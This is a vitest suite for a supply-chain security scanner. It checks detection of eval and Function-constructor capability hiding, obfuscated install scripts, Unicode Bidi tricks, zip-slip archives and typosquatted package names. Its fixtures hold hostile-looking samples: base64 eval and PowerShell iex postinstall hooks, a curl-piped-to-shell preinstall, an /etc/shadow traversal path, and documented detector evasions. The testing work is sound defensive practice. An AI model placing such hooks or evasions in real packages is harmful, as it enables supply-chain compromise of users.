import { describe, it, expect } from 'vitest';
import os from 'node:os';
import { SupplyChainPolicySchema, type SupplyChainPolicy } from '@secureship/contracts';
import { detectUnicodeAttacks } from '../../src/supply-chain/detectors/unicode.detector.js';
import { detectInstallScripts } from '../../src/supply-chain/detectors/install-script.detector.js';
import {
  detectTyposquats,
  PopularListIndex,
} from '../../src/supply-chain/detectors/typosquat.detector.js';
import { SafeTarExtractor } from '../../src/supply-chain/safe-tar.js';
import { AstCapabilityAnalyzer } from '@secureship/reachability';

const POLICY: SupplyChainPolicy = SupplyChainPolicySchema.parse({
  enabled: true,
  typosquat: { minScore: 0.82 },
  entropy: { threshold: 4.5, minLength: 64 },
  obfuscation: { longLine: 1000 },
  semver: { majorJump: 20 },
});

describe('T6 — Evasion & Adversarial Red-Team Suite', () => {
  describe('1. Capability Hiding & Dynamic Reflection Evasion', () => {
    it('detects dynamic eval on concatenated string literals: eval("pro" + "cess")', async () => {
      const code = `eval("pro" + "cess");`;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'eval-concat.js');
      expect(res.capabilities.hasEval).toBe(true);
      expect(res.sites.some((s) => s.capability === 'eval')).toBe(true);
    });

    it('detects Function constructor code dropper: Function("return process")()', async () => {
      const code = `const fn = new Function("return process");\nfn();`;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'function-ctor.js');
      expect(res.capabilities.hasEval).toBe(true);
      expect(res.sites.some((s) => s.capability === 'eval')).toBe(true);
    });

    it('detects dynamic module loading via module.require and process.mainModule.require', async () => {
      const code1 = `const cp = module.require('child_process');\ncp.exec('whoami');`;
      const res1 = await AstCapabilityAnalyzer.analyzeFile(code1, 'mod-req.js');
      expect(res1.capabilities.hasShell).toBe(true);

      const code2 = `const cp2 = process.mainModule.require('child_process');\ncp2.spawn('ls');`;
      const res2 = await AstCapabilityAnalyzer.analyzeFile(code2, 'main-req.js');
      expect(res2.capabilities.hasShell).toBe(true);
    });

    it('detects computed dynamic import specifiers as dynamicRequire capability', async () => {
      const code = `
        const modName = getDynamicModuleName();
        import(modName).then(m => m.run());
      `;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'computed-import.js');
      expect(res.capabilities.hasDynamicRequire).toBe(true);
      expect(res.sites.some((s) => s.capability === 'dynamicRequire')).toBe(true);
    });

    it('records indirect globalThis proxy/getter capability hiding as documented limitation', async () => {
      // Technique: globalThis['pro'+'cess'].env without static literal
      const code = `
        const p = 'pro' + 'cess';
        const env = globalThis[p].env;
      `;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'getter-proxy.js');
      // Documented behavior: runtime string concatenation bypasses static AST identifier matching
      expect(res.capabilities.hasEnvAccess).toBe(false);
    });

    it('records prototype chain Function evasion as documented limitation', async () => {
      // Technique: [].constructor.constructor('return process')()
      const code = `
        const getProc = [].constructor.constructor('return process');
        const p = getProc();
      `;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'proto-constructor.js');
      // Documented behavior: member expression chain [].constructor.constructor is not statically expanded to new Function
      expect(res.capabilities.hasEval).toBe(false);
    });
  });

  describe('2. Install-Time Obfuscation & Evasion Tricks', () => {
    it('detects eval of base64 decoded shell payload: eval $(echo ... | base64 -d)', () => {
      const pkgJson = {
        name: 'install-eval-b64',
        version: '1.0.0',
        scripts: {
          postinstall: 'eval $(echo c2xlZXAgMQ== | base64 -d)',
        },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), POLICY, {
        packageName: 'install-eval-b64',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-INSTALL-003');
      expect(hits[0]?.severity).toBe('CRITICAL');
      expect(hits[0]?.blocking).toBe(true);
    });

    it('detects PowerShell FromBase64String encoded command execution', () => {
      const pkgJson = {
        name: 'ps-base64-dropper',
        version: '1.0.0',
        scripts: {
          install: 'powershell -c "[Convert]::FromBase64String(\'aGVsbG8=\') | iex"',
        },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), POLICY, {
        packageName: 'ps-base64-dropper',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-INSTALL-003');
      expect(hits[0]?.severity).toBe('CRITICAL');
    });

    it('detects remote curl piping directly to shell', () => {
      const pkgJson = {
        name: 'curl-pipe-sh',
        version: '1.0.0',
        scripts: {
          preinstall: 'curl -sSL https://example.test/setup.sh | sh',
        },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), POLICY, {
        packageName: 'curl-pipe-sh',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-INSTALL-003');
    });
  });

  describe('3. Unicode Evasion & Embedding Contexts', () => {
    it('detects Bidi control characters inside regex literals', () => {
      const content = `const pattern = /\u202Eadmin\u2066/;\nif (pattern.test(role)) return true;`;
      const hits = detectUnicodeAttacks(content, 'regex.js', POLICY);
      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-UNI-001');
      expect(hits[0]?.blocking).toBe(true);
    });

    it('detects Bidi control characters inside template literals', () => {
      const content = 'const user = `Hello \u202E\u2066!`;';
      const hits = detectUnicodeAttacks(content, 'template.js', POLICY);
      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-UNI-001');
    });

    it('detects Bidi control characters inside JSON keys or string literals', () => {
      const content = '{\n  "\u202EisAdmin\u2066": true\n}';
      const hits = detectUnicodeAttacks(content, 'config.json', POLICY);
      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-UNI-001');
    });

    it('detects zero-width space hidden inside identifier name', () => {
      const content = 'const auth\u200BToken = "secret";';
      const hits = detectUnicodeAttacks(content, 'token.js', POLICY);
      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-UNI-002');
    });
  });

  describe('4. Scale & Archive Evasion Guards', () => {
    it('rejects archive containing path traversal entry (zip-slip)', () => {
      const header = new Uint8Array(1024);
      const filename = 'package/../../../../etc/shadow';
      for (let i = 0; i < filename.length; i++) {
        header[i] = filename.charCodeAt(i);
      }
      const sizeStr = '00000000000 ';
      for (let i = 0; i < sizeStr.length; i++) {
        header[124 + i] = sizeStr.charCodeAt(i);
      }

      const res = SafeTarExtractor.extract(header);
      expect(res.ok).toBe(true);
      expect(res.files.length).toBe(0);
      expect(res.diagnostics.some((d) => d.includes('Rejected path traversal'))).toBe(true);
    });

    it('halts and aborts extraction when a single file exceeds maxFileSize limit (e.g. 2 MiB)', () => {
      const header = new Uint8Array(1024);
      const filename = 'package/huge-payload.js';
      for (let i = 0; i < filename.length; i++) {
        header[i] = filename.charCodeAt(i);
      }
      // Encode size 3 MiB (3145728 bytes in octal: 14000000)
      const sizeStr = '014000000 ';
      for (let i = 0; i < sizeStr.length; i++) {
        header[124 + i] = sizeStr.charCodeAt(i);
      }

      const res = SafeTarExtractor.extract(header, { maxFileSize: 2 * 1024 * 1024 });
      expect(res.ok).toBe(false);
      expect(res.error).toContain('File size limit exceeded in tarball');
    });

    it('halts and aborts extraction when total archive uncompressed size exceeds maxTotalSize limit', () => {
      const header = new Uint8Array(1024);
      const filename = 'package/bloat.js';
      for (let i = 0; i < filename.length; i++) {
        header[i] = filename.charCodeAt(i);
      }
      // Encode size 105 MiB in octal
      const sizeStr = '0644000000 ';
      for (let i = 0; i < sizeStr.length; i++) {
        header[124 + i] = sizeStr.charCodeAt(i);
      }

      const res = SafeTarExtractor.extract(header, {
        maxFileSize: 200 * 1024 * 1024,
        maxTotalSize: 100 * 1024 * 1024,
      });
      expect(res.ok).toBe(false);
      expect(res.error).toContain('Total uncompressed size limit exceeded');
    });
  });

  describe('5. Typosquat Evasion Tactics', () => {
    const popularIndex = new PopularListIndex([
      { name: 'lodash' },
      { name: 'express' },
      { name: 'chalk' },
    ]);

    it('detects separator collapse trick: lodash-js or node-lodash', async () => {
      const hits1 = await detectTyposquats('lodash-js', 'npm', popularIndex, POLICY);
      expect(hits1.some((h) => h.ruleId === 'SC-TYPO-002')).toBe(true);

      const hits2 = await detectTyposquats('node-lodash', 'npm', popularIndex, POLICY);
      expect(hits2.some((h) => h.ruleId === 'SC-TYPO-002')).toBe(true);
    });

    it('detects character doubling / typo near boundary: llodash', async () => {
      const hits = await detectTyposquats('llodash', 'npm', popularIndex, POLICY);
      expect(hits.some((h) => h.ruleId === 'SC-TYPO-001')).toBe(true);
    });

    it('records phonetically similar or visual-confusable squat as documented limitation if D > 2', async () => {
      // "lodashexx" has distance 3 from "lodash"
      const hits = await detectTyposquats('lodashexx', 'npm', popularIndex, POLICY);
      // Beyond edit distance 2 and not matching prefix/suffix rules
      expect(hits.length).toBe(0);
    });
  });
});
